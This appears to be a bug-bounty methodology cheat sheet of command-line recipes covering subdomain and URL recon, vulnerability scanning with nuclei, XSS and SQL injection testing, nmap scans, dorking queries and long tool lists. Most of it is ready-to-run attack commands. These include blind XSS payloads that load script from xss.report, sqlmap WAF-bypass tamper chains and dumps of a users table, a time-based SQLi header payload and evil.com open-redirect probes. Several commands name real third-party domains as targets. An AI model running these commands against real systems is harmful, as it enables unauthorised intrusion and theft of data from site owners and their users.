
#Bug Hunting methodology

-----------------------------------------------------------------------------
    # subfinder -d example.com -all  -recursive > subdomain.txt # 

    # assetfinder test.com | anew >> subdomain.txt

    # cat subdomain.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 > subdomains_alive.txt

    # katana -u subdomains_alive.txt -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -o allurls.txt

    # cat allurls.txt | grep -E "\.txt|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.json|\.gz|\.rar|\.zip|\.config"

    # cat allurls.txt | grep -E "\.js$" >> js.txt

    # cat sorted.txt | httpx -mc 200 -o live-urls.txt

    # cat live-urls.txt | grep "=" > live-parameters.txt

    # cat alljs.txt | nuclei -t /nuclei-templates/http/exposures/ 

    # echo www.example.com | katana -ps | grep -E "\.js$" | nuclei -t /nuclei-templates/http/exposures/ -c 30

    # nuclei -t /nuclei-templates/takeovers/ -l live-subs.txt

    # echo target.com | gau | grep ".js" | httpx -content-type | grep 'application/javascript'" | awk '{print $1}' | nuclei -t /nuclei-templates/exposures/ -silent > secrets.txt

    # echo uber.com | gau | grep '\.js$' | httpx -status-code -mc 200 -content-type | grep 'application/javascript'

    # python3 paramspider.py --domain indrive.com

    # python3 paramspider.py --domain https://cpcalendars.cartscity.com --exclude woff,css,js,png,svg,php,jpg --output g.txt

    # cat indrive.txt | kxss  ( looking for reflected :-  "<> )


    # dirsearch  -u https://www.viator.com -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,http://sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,.log,.xml,.js.,.json

    # subfinder -d viator.com | httpx-toolkit -silent |  katana -ps -f qurl | gf xss | bxss -appendMode -payload '"><script src=https://xss.report/c/binbash></script>' -parameters

    # subzy run --targets subdomains.txt --concurrency 100 --hide_fails --verify_ssl

    # python3 /opt/Corsy/corsy.py -i subdomains_alive.txt -t 10 --headers "User-Agent: GoogleBot\nCookie: SESSION=Hacked"
~Cors Poc Exploit : https://github.com/hunthack3r/PoCors.git ~

## Looking for Hidden parameters :-


    # arjun -u https://44.75.33.22wms/wms.login -w burp-parameter-names.txt

    # waybackurls example.com | gf xss | grep '=' | qsreplace '"><script src=https://xss.report/c/binbash></script>' | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033[0;31mVulnerable\n";done

    # dalfox url https://access.epam.com/auth/realms/plusx/protocol/openid-connect/auth?response_type=code -b https://hahwul.xss.ht

    # dalfox file urls.txt -b https://hahwul.xss.ht

    # echo "https://target.com/some.php?first=hello&last=world" | Gxss -c 100

    # cat urls.txt | Gxss -c 100 -p XssReflected

## Sql Injection :-

echo https://www.recreation.gov | waybackurls | grep "\?" | uro | httpx -silent > param.txt

cat subdomains.txt | waybackurls | grep "\?" | uro | httpx -silent > param.txt

sqlmap -m param.txt --batch --random-agent --level 1 | tee sqlmap.txt

nuclei -list subdomains_alive.txt -t /Priv8-Nuclei/cors

nuclei  -list ~/vaitor/subdomains_alive.txt -tags cve,osint,tech

sqlmap -u https://my.easyname.at/en/login --dbs --forms --crawl=2

cat allurls.txt | gf lfi | nuclei -tags lfi
cat allurls.txt | gf redirect | openredirex -p /openRedirect

# Waf Bypass techniques Using Sqlmap :-

--dbs --level=5 --risk=3 --user-agent -v3 --tamper="between,randomcase,space2comment" --batch --dump


--tamper=space2comment --level=5 --risk=3


--technique=B


--level=5 --risk=3 --random-agent --user-agent -v3 --batch --threads=10 --dbs


--random-agent --dbms=MYSQL --dbs --technique=B

-v3 --technique=T --no-cast --fresh-queries --banner


tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords


## SQLi One Linear :-

cat target.com | waybackurls | grep "\?" | uro | httpx -silent > urls;sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt

subfinder -dL domains.txt | dnsx | waybackurls | uro | grep "\?" | head -20 | httpx -silent > urls;sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt


## Dump-Data :-

sqlmap -u http://testphp.vulnweb.com/AJAX/infocateg.php?id=1 --dbs  (Databases)

sqlmap -u http://testphp.vulnweb.com/AJAX/infocateg.php?id=1 --tables -D acuart (Dump DB tables )

sqlmap -u http://testphp.vulnweb.com/AJAX/infocateg.php?id=1 --columns -T users (Dump Table Columns )

sqlmap -u http://testphp.vulnweb.com/AJAX/infocateg.php?id=1 --dump -D acuart -T users

__________________________________________________________________________________________________

## SSTI :-


FOR Testing SSTI and tplmap tool :-

git clone https://github.com/epinna/tplmap.git

./tplmap.py -u "domain.com/?parameter=SSTI*"

__________________________________________________________________________________________________

httpx -l live_subs.txt --status-code --title -mc 200 -path /phpinfo.php

httpx -l live_subs.txt --status-code --title -mc 200 -path /composer.json

__________________________________________________________________________________________________



######## Testing for xss and sqli at the same time >_< ##############


cat subdomains.txt | waybackurls | uro | grep "\?" | httpx -silent > param.txt

sqlmap -m param.txt --batch --random-agent --level 1 | tee sqlmap.txt

cat param.txt | kxss   

__________________________________________________________________________________________________


## Blind SQL Injection :-

Tips : X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z


## Blind XSS :-

site:opsgenie.com inurl:"contact" | inurl:"contact-us" | inurl:"contactus" | inurl:"contcat_us" | inurl:"contact_form" | inurl:"contact-form"

## Go to xss.report website and create an account to test for blind xss Vulnerbilitites 
__________________________________________________________________________________________________


## Hunting For Cors Misconfigration :-


https://github.com/chenjj/CORScanner

pip install corscanner

corscanner -i live_subdomains.txt -v -t 100

________________________________________________________________________________________________

https://github.com/Tanmay-N/CORS-Scanner

go install github.com/Tanmay-N/CORS-Scanner@latest

cat CORS-domain.txt | CORS-Scanner

________________________________________________________________________________________________

## Nmap Scanning :-

nmap -sS -p- 192.168.1.4  (-sS) Avoid Firewell && Connection Log.

nmap -sS -p- -iL hosts.txt 

nmap -Pn -sS -A -sV -sC -p 17,80,20,21,22,23,24,25,53,69,80,123,443,1723,4343,8081,8082,8088,53,161,177,3306,8888,27017,27018,139,137,445,8080,8443 -iL liveips.txt -oN scan-result.txt


nmap -Pn -A -sV -sC 67.20.129.216 -p 17,80,20,21,22,23,24,25,53,69,80,123,443,1723,4343,8081,8082,8088,53,161,177,3306,8888,27017,27018,139,137,445,8080,8443 -oN scan-result.txt --script=vuln

nmap -sT -p- 192.168.1.4    (Full Scan (TCP)).

nmap -sT -p- 192.168.1.5 --script=banner (Services Fingerprinting).

nmap -sV 192.168.1.4 (Services Fingerprinting).

nmap 192.168.1.5 -O   (OS Fingerprinting).

nmap 192.168.1.0-255 -sn  (-sn) Live Hosts with me in network.

nmap -iL hosts.txt -sn


nc -nvz 192.168.1.4 1-65535  (Port Scanning Using nc).

nc -vn 34.66.209.2 22        (Services Fingerprinting).


netdiscover     (Devices On Network) (Layer2).

netdiscover -r 192.168.2.0/24  (Range).

netdiscover -p        (Passive).

netdiscover -l hosts.txt
__________________________________________________________________________________________________


## Running Nuclei :-

Scanning target domain with community-curated nuclei templates :-

nuclei -u https://example.com

nuclei -list urls.txt -t /fuzzing-templates

nuclei -list live-subs.txt -t /nuclei-templates/vulnerabilities -t /nuclei-templates/cves -t /nuclei-templates/exposures -t /nuclei-templates/sqli.yaml

nuclei -u https://example.com -w workflows/
__________________________________________________________________________________________________


## Open Redirect:- 

Open Redirection OneLiner :-

waybackurls tesorion.nl | grep -a -i \=http | qsreplace 'evil.com' | while read host do;do curl -s -L $host -I| grep "evil.com" && echo "$host \033[0;31mVulnerable\n" ;done

httpx -l i.txt -path "///evil.com" -status-code -mc 302

_________________________________________________________________________________


## collecting urls and Parameters :-

#Getting urls :- waymore tool (Mazing tool collecting urls from different resources)

Basic Usage:-

waymore -i example.com -mode U -oU result.txt


cat result.txt | sort -u > sorted.txt


#Getting live urls :-

cat sorted.txt | httpx -mc 200 -o live-urls.txt


#Getting parameters from live urls :-

cat live-urls.txt | grep "=" > live-parameters.txt

(live-parameters.txt) Ready for testing.


waymore tool link :-
https://github.com/xnl-h4ck3r/waymore
__________________________________________________________________________________________________

## virtual Host scanner :-

- git clone https://github.com/jobertabma/virtual-host-discovery.git

- ruby scan.rb --ip=151.101.194.133 --host=cisco.com

__________________________________________________________________________________________________


## JS Hunting :-


1- ﻿echo target.com | gau | grep ".js" | httpx -content-type | grep 'application/javascript'" | awk '{print $1}' | nuclei -t /root/nuclei-templates/exposures/ -silent > secrets.txt


2- echo uber.com | gau | grep '\.js$' | httpx -status-code -mc 200 -content-type | grep 'application/javascript'


3- JSS-Scanner :-

- echo "invisionapp.com" | waybackurls | grep -iE '\.js'|grep -ivE '\.json'|sort -u  > j.txt

- python3 JSScanner.py


__________________________________________________________________________________________________


## Shodan Dorking :-


- ssl.cert.subject.CN:"gevme.com*" 200

- ssl.cert.subject.CN:"*.target.com" "230 login successful" port:"21"

- ssl.cert.subject.CN:"*.target.com"+200 http.title:"Admin"

- Set-Cookie:"mongo-express=" "200 OK"

- ssl:"invisionapp.com" http.title:"index of / "

- ssl:"arubanetworks.com" 200 http.title:"dashboard"

- net:192.168.43/24, 192.168.40/24

- AEM Login panel :-  git clone https://github.com/0ang3el/aem-hacker.git

User:anonymous
Pass:anonymous


## Collect all interisting ips from Shodan and save them in ips.txt

- cat ips.txt | httpx > live-ips.txt

- cat live_ips.txt | dirsearch --stdin

__________________________________________________________________________________________________


## Google dorking :-

- site:*.gapinc.com inurl:”*admin | login” | inurl:.php | .asp

- intext:"index of /.git"

- site:*.*.edu intext:"sql syntax near" | intext:"syntax error has occurred" | intext:"incorrect syntax near" | intext:"unexpected end of SQL command" | intext:"Warning: mysql_connect()" | intext:"Warning: mysql_query()" | intext:"Warning: pg_connect()"


- site:*.mil link:www.facebook.com | link:www.instagram.com | link:www.twitter.com | link:www.youtube.com | link:www.telegram.com |
link:www.hackerone.com | link:www.slack.com | link:www.github.com

- inurl:/geoserver/web/ (intext:2.21.4 | intext:2.22.2)

- inurl:/geoserver/ows?service=wfs


__________________________________________________________________________________________________


## Github Dorking on live-subs.txt :-

- git-Grabber :-

- python3 gitGraber.py -k wordlists/keywords.txt -q "yahoo" -s

- python3 gitGraber.py -k wordlists/keywords.txt -q \"yahoo.com\" -s

- python3 gitGraber.py -k keywordsfile.txt -q \"yahoo.com\" -s -w mywordlist.txt


- GitHound



## Resources And Tools :-

https://github.com/orwagodfather/x

https://github.com/SAPT01/HBSQLI

python3 hbsqli.py -l y.txt -p payloads.txt -H headers.txt -v

python3 hbsqli.py -u "https://target.com" -p payloads.txt -H headers.txt -v

https://github.com/thecybertix/One-Liner-Collections

https://github.com/projectdiscovery/fuzzing-templates

https://github.com/0xKayala/NucleiFuzzer

https://wpscan.com/vulnerability/825eccf9-f351-4a5b-b238-9969141b94fa

_________________________________________________________________________________


####### 📌 Complete Bug Bounty tool List 📌

dnscan https://github.com/rbsec/dnscan

Knockpy https://github.com/guelfoweb/knock

Sublist3r https://github.com/aboul3la/Sublist3r

massdns https://github.com/blechschmidt/massdns

nmap https://nmap.org

masscan https://github.com/robertdavidgraham/masscan

EyeWitness https://github.com/ChrisTruncer/EyeWitness

DirBuster https://sourceforge.net/projects/dirbuster/

dirsearch https://github.com/maurosoria/dirsearch

Gitrob https://github.com/michenriksen/gitrob 

git-secrets https://github.com/awslabs/git-secrets

sandcastle https://github.com/yasinS/sandcastle

bucket_finder https://digi.ninja/projects/bucket_finder.php

GoogD0rker https://github.com/ZephrFish/GoogD0rker/

Wayback Machine https://web.archive.org

waybackurls https://gist.github.com/mhmdiaa/adf6bff70142e5091792841d4b372050 Sn1per https://github.com/1N3/Sn1per/

XRay https://github.com/evilsocket/xray

wfuzz https://github.com/xmendez/wfuzz/

patator https://github.com/lanjelot/patator

datasploit https://github.com/DataSploit/datasploit

hydra https://github.com/vanhauser-thc/thc-hydra

changeme https://github.com/ztgrace/changeme

MobSF https://github.com/MobSF/Mobile-Security-Framework-MobSF/ Apktool https://github.com/iBotPeaches/Apktool

dex2jar https://sourceforge.net/projects/dex2jar/

sqlmap http://sqlmap.org/

oxml_xxe https://github.com/BuffaloWill/oxml_xxe/ @cyb3rhunt3r

XXE Injector https://github.com/enjoiz/XXEinjector

The JSON Web Token Toolkit https://github.com/ticarpi/jwt_tool

ground-control https://github.com/jobertabma/ground-control

ssrfDetector https://github.com/JacobReynolds/ssrfDetector

LFISuit https://github.com/D35m0nd142/LFISuite

GitTools https://github.com/internetwache/GitTools

dvcs-ripper https://github.com/kost/dvcs-ripper

tko-subs https://github.com/anshumanbh/tko-subs

HostileSubBruteforcer https://github.com/nahamsec/HostileSubBruteforcer Race the Web https://github.com/insp3ctre/race-the-web

ysoserial https://github.com/GoSecure/ysoserial

PHPGGC https://github.com/ambionics/phpggc

CORStest https://github.com/RUB-NDS/CORStest

retire-js https://github.com/RetireJS/retire.js

getsploit https://github.com/vulnersCom/getsploit

Findsploit https://github.com/1N3/Findsploit

bfac https://github.com/mazen160/bfac

WPScan https://wpscan.org/

CMSMap https://github.com/Dionach/CMSmap

Amass https://github.com/OWASP/Amass

_________________________________________________________________________________
NUCLEI TEMPLATES:

https://github.com/0x71rex/0-fuzzing-templates
https://github.com/0xPugazh/my-nuclei-templates
https://github.com/0xc4sper0/Nuclei-templates
https://github.com/0xmaximus/final_freaking_nuclei_templates
https://github.com/1in9e/my-nuclei-templates
https://github.com/20142995/nuclei-templates
https://github.com/5cr1pt/templates
https://github.com/ARPSyndicate/kenzer-templates
https://github.com/Arvinthksrct/alltemplate
https://github.com/AshiqurEmon/nuclei_templates
https://github.com/Caddyshack2175/nuclei-custom-templates
https://github.com/Dalaho-bangin/my_nuclei_templates
https://github.com/DoubleTakes/nuclei-templates
https://github.com/Elsfa7-110/mynuclei-templates
https://github.com/HideNsec/nuclei-bitrix-templates
https://github.com/Hunt2behunter/nuclei-templates
https://github.com/Jagomeiister/nuclei-templates
https://github.com/JoshMorrison99/my-nuceli-templates
https://github.com/JoshMorrison99/url-based-nuclei-templates
https://github.com/KeepHowling/all_freaking_nuclei_templates
https://github.com/Lopseg/nuclei-c-templates
https://github.com/MR-pentestGuy/nuclei-templates
https://github.com/NightRang3r/misc_nuclei_templates
https://github.com/PedroF-369/nuclei_templates
https://github.com/PedroFerreira97/nuclei_templates
https://github.com/Shakilll/my_nuclei_templates
https://github.com/ShangRui-hash/my-nuclei-templates
https://github.com/SirAppSec/nuclei-template-generator-log4j
https://github.com/Str1am/my-nuclei-templates
https://github.com/U53RW4R3/nuclei-fuzzer-templates
https://github.com/UltimateSec/ultimaste-nuclei-templates
https://github.com/VulnExpo/nuclei-templates
https://github.com/adampielak/nuclei-templates
https://github.com/al00000000al/my_nuclei_templates
https://github.com/alexrydzak/rydzak-nuclei-templates
https://github.com/binod235/nuclei-templates-and-reports
https://github.com/blazeinfosec/nuclei-templates
https://github.com/boobooHQ/private_templates
https://github.com/brinhosa/brinhosa-nuclei-templates
https://github.com/c-sh0/nuclei_templates
https://github.com/cipher387/juicyinfo-nuclei-templates
https://github.com/daffainfo/my-nuclei-templates
https://github.com/damon-sec/Nuclei-templates-Collection
https://github.com/dk4trin/templates-nuclei
https://github.com/ed-red/redmc_custom_templates_nuclei
https://github.com/edoardottt/missing-cve-nuclei-templates
https://github.com/emadshanab/Nuclei-Templates-Collection/blob/main/remove_duplicated_templates.py
https://github.com/erickfernandox/nuclei-templates
https://github.com/esetal/nuclei-bb-templates
https://github.com/ethicalhackingplayground/erebus-templates
https://github.com/freakyclown/Nuclei_templates
https://github.com/geeknik/nuclei-templates-1
https://github.com/geeknik/the-nuclei-templates
https://github.com/glyptho/templatesallnuclei
https://github.com/h0tak88r/nuclei_templates
https://github.com/h4ndsh/nuclei-templates
https://github.com/im403/nuclei-temp
https://github.com/imhunterand/nuclei-custom-templates
https://github.com/javaongsan/nuclei-templates
https://github.com/kabilan1290/templates
https://github.com/madisec/nuclei-templates
https://github.com/mdsabbirkhan/0xPugazh-my-nuclei-templates
https://github.com/microphone-mathematics/custom-nuclei-templates
https://github.com/n1f2c3/mytemplates
https://github.com/notnotnotveg/nuclei-custom-templates
https://github.com/nvsecurity/nightvision-nuclei-templates
https://github.com/obreinx/nuceli-templates
https://github.com/optiv/mobile-nuclei-templates
https://github.com/panch0r3d/nuclei-templates
https://github.com/pikpikcu/my-nuclei-templates
https://github.com/pikpikcu/nuclei-templates
https://github.com/ping-0day/templates
https://github.com/praetorian-inc/chariot-launch-nuclei-templates
https://github.com/projectdiscovery/nuclei-templates
https://github.com/ptyspawnbinbash/template-enhancer
https://github.com/rafaelwdornelas/my-nuclei-templates
https://github.com/rahulkadavil/nuclei-templates
https://github.com/randomstr1ng/nuclei-sap-templates
https://github.com/redteambrasil/nuclei-templates
https://github.com/ree4pwn/my-nuclei-templates
https://github.com/reewardius/interested-nuclei-templates
https://github.com/reewardius/log4shell-templates
https://github.com/ricardomaia/nuclei-template-generator-for-wordpress-plugins
https://github.com/sadnansakin/my-nuclei-templates
https://github.com/securitytest3r/nuclei_templates_work
https://github.com/sharathkramadas/k8s-nuclei-templates
https://github.com/smaranchand/nuclei-templates
https://github.com/solo10010/solo-nuclei-templates
https://github.com/srkgupta/cent-nuclei-templates
https://github.com/th3r4id/nuclei-templates
https://github.com/thanhnx9/nuclei-templates-cutomer
https://github.com/thecyberneh/nuclei-templatess
https://github.com/thelabda/nuclei-templates
https://github.com/themoonbaba/private_templates
https://github.com/themoonbaba/private_templates/blob/main/springboot_heapdump.yaml
https://github.com/umityn/my-nuclei-templates
https://github.com/vulnspace/nuclei-templates
https://github.com/wasp76b/nuclei-templates
https://github.com/wearetyomsmnv/llm_integrated_nuclei_templates
https://github.com/wr00t/templates
https://github.com/xinZa1/template
https://github.com/yarovit-developer/nuclei-templates
https://github.com/yavolo/nuclei-templates
https://github.com/z3bd/nuclei-templates
https://github.com/zerbaliy3v/custom-nuclei-templates




